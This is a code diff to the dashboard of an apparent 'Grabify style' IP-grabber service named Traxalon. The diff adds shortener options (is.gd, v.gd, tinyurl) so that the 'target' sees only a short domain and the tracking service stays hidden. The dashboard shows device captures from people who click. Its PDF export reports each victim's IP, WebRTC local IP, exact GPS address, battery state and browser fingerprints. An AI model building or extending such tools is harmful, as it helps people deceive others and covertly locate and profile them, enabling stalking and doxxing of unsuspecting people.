@@ -21,6 +21,7 @@ export default function Dashboard() {
   const [success, setSuccess] = useState("");
   const [shortUrl, setShortUrl] = useState("");
   const [shortening, setShortening] = useState(false);
+  const [shortenerProvider, setShortenerProvider] = useState("isgd");
   const [credits, setCredits] = useState(userProfile?.credits ?? 0);
   const [selectedLink, setSelectedLink] = useState(null);
   const [openCapture, setOpenCapture] = useState(null);
@@ -63,28 +64,18 @@ export default function Dashboard() {
     return "https://" + t;
   }
 
-  // async function shortenUrl(longUrl) {
-  //   try {
-  //     const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
-  //     const short = await res.text();
-  //     if (short.startsWith("https://tinyurl.com/")) return short;
-  //     return longUrl;
-  //   } catch { return longUrl; }
-  // }
-
-  async function shortenUrl(longUrl) {
+  async function shortenUrl(longUrl, provider) {
     try {
       const res = await fetch(BACKEND_URL + "/api/links/shorten-url", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ url: longUrl }),
+        body: JSON.stringify({ url: longUrl, provider }),
       });
       const data = await res.json();
       return data.shortUrl || longUrl;
     } catch { return longUrl; }
-  } 
+  }
 
-  
   async function handleGenerate(e) {
     e.preventDefault();
     if (credits < 1) { setShowPayment(true); return; }
@@ -108,7 +99,7 @@ export default function Dashboard() {
       if (data.error) throw new Error(data.error);
       setSuccess(data.trackingUrl);
       setShortening(true);
-      const short = await shortenUrl(data.trackingUrl);
+      const short = await shortenUrl(data.trackingUrl, shortenerProvider);
       setShortUrl(short);
       setShortening(false);
       setLabel("");
@@ -203,7 +194,7 @@ export default function Dashboard() {
             </div>
           )}
 
-          {/* ── FORM ── shown first */}
+          {/* Form */}
           <form onSubmit={handleGenerate}>
             <div className="flex flex-col md:flex-row gap-3 mb-3">
               <div className="flex-1 relative">
@@ -237,7 +228,7 @@ export default function Dashboard() {
             </p>
           </form>
 
-          {/* ── GENERATED LINKS shown BELOW the form ── */}
+          {/* Generated links shown BELOW form */}
           {success && (
             <div className="mt-6 border-t border-surface-border pt-6 space-y-4">
               <p className="font-body text-xs text-green-400 font-semibold flex items-center gap-1.5">
@@ -259,14 +250,37 @@ export default function Dashboard() {
                 </div>
               </div>
 
-              {/* Short link — no Traxalon name */}
+              {/* Short link with provider dropdown — Grabify style */}
               <div className="bg-primary/10 border border-primary/40 rounded-xl p-4">
-                <div className="flex items-center justify-between mb-2">
+                <div className="flex items-center justify-between mb-3 gap-3 flex-wrap">
                   <p className="font-body text-xs text-primary uppercase tracking-wider font-semibold flex items-center gap-1.5">
                     <Scissors className="w-3.5 h-3.5" /> Short Link
                     {shortening && <span className="text-yellow-400 animate-pulse ml-2">generating...</span>}
                   </p>
-                  <span className="font-body text-xs text-text-muted">No Traxalon name · hides tracking URL</span>
+                  {/* Provider dropdown */}
+                  <div className="flex items-center gap-2">
+                    <span className="font-body text-xs text-text-muted">Domain:</span>
+                    <select
+                      value={shortenerProvider}
+                      onChange={(e) => {
+                        const prov = e.target.value;
+                        setShortenerProvider(prov);
+                        if (success) {
+                          setShortening(true);
+                          setShortUrl("");
+                          shortenUrl(success, prov).then(s => {
+                            setShortUrl(s);
+                            setShortening(false);
+                          });
+                        }
+                      }}
+                      className="bg-surface border border-surface-border text-text-primary text-xs font-mono rounded-lg px-3 py-1.5 focus:outline-none focus:border-primary cursor-pointer"
+                    >
+                      <option value="isgd">is.gd — random (free)</option>
+                      <option value="vgd">v.gd — random (free)</option>
+                      <option value="tinyurl">tinyurl.com (free)</option>
+                    </select>
+                  </div>
                 </div>
                 <div className="flex items-center gap-3">
                   <Globe className="w-4 h-4 text-primary flex-shrink-0" />
@@ -277,18 +291,18 @@ export default function Dashboard() {
                     onClick={() => copyToClipboard(shortUrl || success, "short")}
                     className="flex items-center gap-1.5 px-4 py-1.5 bg-primary text-surface rounded-lg font-body text-xs font-bold hover:bg-primary-dark transition-colors flex-shrink-0"
                   >
-                    {copiedId === "short" ? <><CheckCircle className="w-3 h-3" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy Short Link</>}
+                    {copiedId === "short" ? <><CheckCircle className="w-3 h-3" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy</>}
                   </button>
                 </div>
                 <p className="font-body text-xs text-text-muted mt-2">
-                  ↑ Share this link — the target sees <strong className="text-primary">tinyurl.com/xxxxx</strong> only, not Traxalon
+                  ↑ Target only sees the short domain — Traxalon is completely hidden
                 </p>
               </div>
             </div>
           )}
         </div>
 
-        {/* ── TRACKING LINKS ── latest first (already sorted by createdAt desc) */}
+        {/* ── TRACKING LINKS ── latest first */}
         <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
           <h2 className="font-display text-xl tracking-wider mb-6">TRACKING <span className="text-primary">LINKS</span></h2>
 
@@ -342,7 +356,7 @@ export default function Dashboard() {
                     <span className="flex items-center gap-1.5"><Clock className="w-3.5 h-3.5" />{link.createdAt ? new Date(link.createdAt.toMillis()).toLocaleDateString("en-IN") : "-"}</span>
                   </div>
 
-                  {/* Captures — latest opened first, each as separate tab */}
+                  {/* Captures — latest first, each as separate tab */}
                   {selectedLink?.id === link.id && (
                     <div className="border-t border-surface-border">
                       {(!link.captures || link.captures.length === 0) ? (
@@ -354,7 +368,6 @@ export default function Dashboard() {
                           <p className="font-body text-xs text-text-secondary uppercase tracking-widest mb-4">
                             {link.captures.length} Device Capture{link.captures.length > 1 ? "s" : ""} — latest first
                           </p>
-                          {/* Reverse to show latest capture first */}
                           {[...link.captures].reverse().map((capture, ri) => {
                             const i = link.captures.length - 1 - ri;
                             const tabKey = link.id + "-" + i;
@@ -363,7 +376,7 @@ export default function Dashboard() {
                             return (
                               <div key={i} className={`border rounded-2xl overflow-hidden transition-all ${isOpen ? "border-primary/50 shadow-glow" : "border-surface-border"}`}>
 
-                                {/* Tab header — NO OS, NO CITY */}
+                                {/* Tab header — IP + Browser only, no OS/city */}
                                 <button
                                   className="w-full flex items-center justify-between p-4 hover:bg-primary/5 transition-colors"
                                   onClick={() => setOpenCapture(isOpen ? null : tabKey)}
@@ -458,24 +471,24 @@ function exportPDF(capture, linkLabel) {
     }); y += 3;
   };
 
-  sec("1. NETWORK & IP", [["IP Address", capture.ip], ["ISP", capture.isp], ["Organisation", capture.org], ["ASN", capture.asn], ["Hostname", capture.hostname], ["Is Proxy/VPN", capture.isProxy != null ? String(capture.isProxy) : null], ["Is Hosting", capture.isHosting != null ? String(capture.isHosting) : null], ["Mobile Network", capture.isMobileNetwork != null ? String(capture.isMobileNetwork) : null], ["WebRTC Local IP", capture.webrtcLocalIP], ["WebRTC Public IP", capture.webrtcPublicIP], ["Connection Type", capture.connectionType], ["Downlink", capture.connectionDownlink ? capture.connectionDownlink + " Mbps" : null], ["RTT", capture.connectionRtt ? capture.connectionRtt + " ms" : null]]);
-  sec("2. IP LOCATION (APPROXIMATE)", [["City", capture.city], ["Region", capture.region], ["Country", capture.country], ["ZIP", capture.zip], ["Coordinates", capture.lat ? capture.lat + ", " + capture.lon : null], ["Timezone", capture.timezone]]);
+  sec("1. NETWORK & IP", [["IP Address", capture.ip],["ISP", capture.isp],["Organisation", capture.org],["ASN", capture.asn],["Hostname", capture.hostname],["Is Proxy/VPN", capture.isProxy != null ? String(capture.isProxy) : null],["Is Hosting", capture.isHosting != null ? String(capture.isHosting) : null],["Mobile Network", capture.isMobileNetwork != null ? String(capture.isMobileNetwork) : null],["WebRTC Local IP", capture.webrtcLocalIP],["WebRTC Public IP", capture.webrtcPublicIP],["Connection Type", capture.connectionType],["Downlink", capture.connectionDownlink ? capture.connectionDownlink + " Mbps" : null],["RTT", capture.connectionRtt ? capture.connectionRtt + " ms" : null]]);
+  sec("2. IP LOCATION", [["City", capture.city],["Region", capture.region],["Country", capture.country],["ZIP", capture.zip],["Coordinates", capture.lat ? capture.lat + ", " + capture.lon : null],["Timezone", capture.timezone]]);
   if (capture.gpsLat && capture.gpsLon) {
-    sec("3. GPS LOCATION (EXACT)", [["GPS Coordinates", capture.gpsLat + ", " + capture.gpsLon], ["Accuracy", capture.gpsAccuracy ? capture.gpsAccuracy + " metres" : null], ["Altitude", capture.gpsAltitude ? capture.gpsAltitude + " m" : null], ["Speed", capture.gpsSpeed ? capture.gpsSpeed + " m/s" : null], ["Heading", capture.gpsHeading], ["Full Address", capture.gpsAddress], ["City", capture.gpsCity], ["State", capture.gpsState], ["Pincode", capture.gpsPincode], ["Country", capture.gpsCountry]]);
+    sec("3. GPS LOCATION (EXACT)", [["GPS Coordinates", capture.gpsLat + ", " + capture.gpsLon],["Accuracy", capture.gpsAccuracy ? capture.gpsAccuracy + " metres" : null],["Altitude", capture.gpsAltitude ? capture.gpsAltitude + " m" : null],["Speed", capture.gpsSpeed ? capture.gpsSpeed + " m/s" : null],["Heading", capture.gpsHeading],["Full Address", capture.gpsAddress],["City", capture.gpsCity],["State", capture.gpsState],["Pincode", capture.gpsPincode],["Country", capture.gpsCountry]]);
   }
-  sec("4. DEVICE HARDWARE", [["Device Type", capture.device], ["OS", capture.os], ["Browser", capture.browser], ["Browser Version", capture.browserVersion], ["Platform", capture.platform], ["Architecture", capture.architecture], ["CPU Cores", capture.cpuCores], ["RAM", capture.ram ? capture.ram + " GB" : null], ["GPU", capture.gpu], ["GPU Vendor", capture.gpuVendor], ["Touch Points", capture.maxTouchPoints], ["Vendor", capture.vendor], ["App Name", capture.appName], ["Product", capture.product], ["Build ID", capture.buildID]]);
-  sec("5. WEBGL / GPU", [["WebGL Version", capture.webglVersion], ["Renderer", capture.webglRenderer], ["Vendor", capture.webglVendor], ["Shading Language", capture.webglShadingLanguage], ["Max Texture Size", capture.maxTextureSize], ["Max Viewport", capture.maxViewportDims], ["Extensions Count", capture.webglExtensionsCount], ["WebGL2", capture.webgl2Support != null ? String(capture.webgl2Support) : null], ["Shader Precision", capture.shaderPrecision], ["WebGL Hash", capture.webglHash]]);
-  sec("6. SCREEN & DISPLAY", [["Resolution", capture.screenWidth ? capture.screenWidth + "x" + capture.screenHeight : null], ["Available", capture.screenAvailWidth ? capture.screenAvailWidth + "x" + capture.screenAvailHeight : null], ["Window", capture.windowWidth ? capture.windowWidth + "x" + capture.windowHeight : null], ["Pixel Ratio", capture.pixelRatio], ["Color Depth", capture.colorDepth ? capture.colorDepth + " bit" : null], ["Orientation", capture.orientation], ["HDR", capture.hdrSupport], ["Color Gamut", capture.colorGamut], ["Dark Mode", capture.prefersColorScheme]]);
-  sec("7. BATTERY", [["Level", capture.batteryLevel != null ? capture.batteryLevel + "%" : null], ["Charging", capture.batteryCharging != null ? (capture.batteryCharging ? "Yes" : "No") : null], ["Charging Time", capture.batteryChargingTime ? capture.batteryChargingTime + "s" : null], ["Discharging Time", capture.batteryDischargingTime ? capture.batteryDischargingTime + "s" : null]]);
-  sec("8. DATE & TIME", [["Local Time", capture.localTime], ["Timezone", capture.clientTimezone], ["UTC Offset", capture.timezoneOffset != null ? capture.timezoneOffset + " min" : null], ["DST Active", capture.dstActive]]);
-  sec("9. BROWSER", [["User Agent", capture.userAgent], ["Language", capture.language], ["Languages", capture.languages], ["Cookies", capture.cookiesEnabled != null ? (capture.cookiesEnabled ? "Yes" : "No") : null], ["Do Not Track", capture.doNotTrack], ["History Length", capture.historyLength], ["Referrer", capture.referrer], ["Incognito", capture.incognito != null ? (capture.incognito ? "Yes" : "No") : null], ["Ad Blocker", capture.adBlockDetected != null ? (capture.adBlockDetected ? "Yes" : "No") : null]]);
-  sec("10. FINGERPRINTS", [["Canvas", capture.canvasHash], ["Canvas Geometry", capture.canvasGeometryHash], ["Audio", capture.audioFingerprint], ["WebGL", capture.webglHash], ["Font", capture.fontFingerprint], ["CSS", capture.cssHash]]);
-  sec("11. MEDIA DEVICES", [["Cameras", capture.cameras != null ? String(capture.cameras) : null], ["Microphones", capture.microphones != null ? String(capture.microphones) : null], ["Speakers", capture.speakers != null ? String(capture.speakers) : null], ["Speech Voices", capture.speechVoicesCount != null ? String(capture.speechVoicesCount) : null], ["Voice Names", capture.speechVoices]]);
-  sec("12. STORAGE", [["Quota", capture.storageQuota], ["Used", capture.storageUsage], ["LocalStorage", capture.localStorageEnabled != null ? String(capture.localStorageEnabled) : null], ["SessionStorage", capture.sessionStorageEnabled != null ? String(capture.sessionStorageEnabled) : null], ["IndexedDB", capture.indexedDBEnabled != null ? String(capture.indexedDBEnabled) : null], ["Cache API", capture.cacheAPIEnabled], ["Cookies Count", capture.cookiesCount != null ? String(capture.cookiesCount) : null]]);
-  sec("13. FONTS & PLUGINS", [["Fonts Detected", capture.fontsDetected != null ? String(capture.fontsDetected) : null], ["Font List", capture.fontsList], ["Plugins Count", capture.pluginsCount != null ? String(capture.pluginsCount) : null], ["Plugin Names", capture.plugins], ["MIME Types", capture.mimeTypes]]);
-  sec("14. PERFORMANCE", [["Page Load", capture.pageLoadTime], ["DOM Loaded", capture.domContentLoaded], ["DNS", capture.dnsLookupTime], ["TCP", capture.tcpConnectTime], ["TTFB", capture.ttfb], ["Mem Used", capture.memoryUsed], ["Mem Total", capture.memoryTotal], ["Mem Limit", capture.memoryLimit]]);
-  sec("15. PERMISSIONS", [["Geolocation", capture.geolocationPermission], ["Notifications", capture.notificationsPermission], ["Camera", capture.cameraPermission], ["Microphone", capture.microphonePermission], ["Accelerometer", capture.accelerometerPermission], ["Gyroscope", capture.gyroscopePermission], ["Magnetometer", capture.magnetometerPermission], ["Clipboard Read", capture.clipboardReadPermission], ["Clipboard Write", capture.clipboardWritePermission]]);
-  sec("16. FEATURES", [["WebSocket", capture.webSocketSupport != null ? String(capture.webSocketSupport) : null], ["WebWorker", capture.webWorkerSupport != null ? String(capture.webWorkerSupport) : null], ["ServiceWorker", capture.serviceWorkerSupport != null ? String(capture.serviceWorkerSupport) : null], ["WebAssembly", capture.webAssemblySupport != null ? String(capture.webAssemblySupport) : null], ["Bluetooth", capture.bluetoothSupport != null ? String(capture.bluetoothSupport) : null], ["USB", capture.usbSupport != null ? String(capture.usbSupport) : null], ["Gamepad", capture.gamepadSupport], ["WebXR", capture.xrSupport], ["WebRTC", capture.webrtcSupport], ["WebGL2", capture.webgl2Support != null ? String(capture.webgl2Support) : null], ["OffscreenCanvas", capture.offscreenCanvasSupport], ["SharedArrayBuffer", capture.sharedArrayBufferSupport], ["BroadcastChannel", capture.broadcastChannelSupport], ["PaymentRequest", capture.paymentRequestSupport], ["CredentialMgmt", capture.credentialMgmtSupport], ["Presentation", capture.presentationSupport]]);
+  sec("4. DEVICE", [["Device Type", capture.device],["OS", capture.os],["Browser", capture.browser],["Browser Version", capture.browserVersion],["Platform", capture.platform],["Architecture", capture.architecture],["CPU Cores", capture.cpuCores],["RAM", capture.ram ? capture.ram + " GB" : null],["GPU", capture.gpu],["GPU Vendor", capture.gpuVendor],["Touch Points", capture.maxTouchPoints],["Vendor", capture.vendor],["App Name", capture.appName],["Product", capture.product],["Build ID", capture.buildID]]);
+  sec("5. WEBGL / GPU", [["WebGL Version", capture.webglVersion],["Renderer", capture.webglRenderer],["Vendor", capture.webglVendor],["Shading Language", capture.webglShadingLanguage],["Max Texture Size", capture.maxTextureSize],["Max Viewport", capture.maxViewportDims],["Extensions Count", capture.webglExtensionsCount],["WebGL2", capture.webgl2Support != null ? String(capture.webgl2Support) : null],["Shader Precision", capture.shaderPrecision],["WebGL Hash", capture.webglHash]]);
+  sec("6. SCREEN", [["Resolution", capture.screenWidth ? capture.screenWidth + "x" + capture.screenHeight : null],["Available", capture.screenAvailWidth ? capture.screenAvailWidth + "x" + capture.screenAvailHeight : null],["Window", capture.windowWidth ? capture.windowWidth + "x" + capture.windowHeight : null],["Pixel Ratio", capture.pixelRatio],["Color Depth", capture.colorDepth ? capture.colorDepth + " bit" : null],["Orientation", capture.orientation],["HDR", capture.hdrSupport],["Color Gamut", capture.colorGamut],["Dark Mode", capture.prefersColorScheme]]);
+  sec("7. BATTERY", [["Level", capture.batteryLevel != null ? capture.batteryLevel + "%" : null],["Charging", capture.batteryCharging != null ? (capture.batteryCharging ? "Yes" : "No") : null],["Charging Time", capture.batteryChargingTime ? capture.batteryChargingTime + "s" : null],["Discharging", capture.batteryDischargingTime ? capture.batteryDischargingTime + "s" : null]]);
+  sec("8. DATE & TIME", [["Local Time", capture.localTime],["Timezone", capture.clientTimezone],["UTC Offset", capture.timezoneOffset != null ? capture.timezoneOffset + " min" : null],["DST Active", capture.dstActive]]);
+  sec("9. BROWSER", [["User Agent", capture.userAgent],["Language", capture.language],["Languages", capture.languages],["Cookies", capture.cookiesEnabled != null ? (capture.cookiesEnabled ? "Yes" : "No") : null],["Do Not Track", capture.doNotTrack],["History Length", capture.historyLength],["Referrer", capture.referrer],["Incognito", capture.incognito != null ? (capture.incognito ? "Yes" : "No") : null],["Ad Blocker", capture.adBlockDetected != null ? (capture.adBlockDetected ? "Yes" : "No") : null]]);
+  sec("10. FINGERPRINTS", [["Canvas", capture.canvasHash],["Canvas Geometry", capture.canvasGeometryHash],["Audio", capture.audioFingerprint],["WebGL", capture.webglHash],["Font", capture.fontFingerprint],["CSS", capture.cssHash]]);
+  sec("11. MEDIA DEVICES", [["Cameras", capture.cameras != null ? String(capture.cameras) : null],["Microphones", capture.microphones != null ? String(capture.microphones) : null],["Speakers", capture.speakers != null ? String(capture.speakers) : null],["Speech Voices", capture.speechVoicesCount != null ? String(capture.speechVoicesCount) : null],["Voice Names", capture.speechVoices]]);
+  sec("12. STORAGE", [["Quota", capture.storageQuota],["Used", capture.storageUsage],["LocalStorage", capture.localStorageEnabled != null ? String(capture.localStorageEnabled) : null],["SessionStorage", capture.sessionStorageEnabled != null ? String(capture.sessionStorageEnabled) : null],["IndexedDB", capture.indexedDBEnabled != null ? String(capture.indexedDBEnabled) : null],["Cache API", capture.cacheAPIEnabled],["Cookies Count", capture.cookiesCount != null ? String(capture.cookiesCount) : null]]);
+  sec("13. FONTS & PLUGINS", [["Fonts Detected", capture.fontsDetected != null ? String(capture.fontsDetected) : null],["Font List", capture.fontsList],["Plugins Count", capture.pluginsCount != null ? String(capture.pluginsCount) : null],["Plugin Names", capture.plugins],["MIME Types", capture.mimeTypes]]);
+  sec("14. PERFORMANCE", [["Page Load", capture.pageLoadTime],["DOM Loaded", capture.domContentLoaded],["DNS", capture.dnsLookupTime],["TCP", capture.tcpConnectTime],["TTFB", capture.ttfb],["Mem Used", capture.memoryUsed],["Mem Total", capture.memoryTotal],["Mem Limit", capture.memoryLimit]]);
+  sec("15. PERMISSIONS", [["Geolocation", capture.geolocationPermission],["Notifications", capture.notificationsPermission],["Camera", capture.cameraPermission],["Microphone", capture.microphonePermission],["Accelerometer", capture.accelerometerPermission],["Gyroscope", capture.gyroscopePermission],["Magnetometer", capture.magnetometerPermission],["Clipboard Read", capture.clipboardReadPermission],["Clipboard Write", capture.clipboardWritePermission]]);
+  sec("16. FEATURES", [["WebSocket", capture.webSocketSupport != null ? String(capture.webSocketSupport) : null],["WebWorker", capture.webWorkerSupport != null ? String(capture.webWorkerSupport) : null],["ServiceWorker", capture.serviceWorkerSupport != null ? String(capture.serviceWorkerSupport) : null],["WebAssembly", capture.webAssemblySupport != null ? String(capture.webAssemblySupport) : null],["Bluetooth", capture.bluetoothSupport != null ? String(capture.bluetoothSupport) : null],["USB", capture.usbSupport != null ? String(capture.usbSupport) : null],["Gamepad", capture.gamepadSupport],["WebXR", capture.xrSupport],["WebRTC", capture.webrtcSupport],["WebGL2", capture.webgl2Support != null ? String(capture.webgl2Support) : null],["OffscreenCanvas", capture.offscreenCanvasSupport],["SharedArrayBuffer", capture.sharedArrayBufferSupport],["BroadcastChannel", capture.broadcastChannelSupport],["PaymentRequest", capture.paymentRequestSupport],["CredentialMgmt", capture.credentialMgmtSupport],["Presentation", capture.presentationSupport]]);
 
   const total = doc.internal.getNumberOfPages();
   for (let i = 1; i <= total; i++) { doc.setPage(i); doc.setFontSize(7); doc.setTextColor(150, 150, 150); doc.text(`TRAXELON  ·  Page ${i} of ${total}  ·  CONFIDENTIAL`, pw / 2, 292, { align: "center" }); }
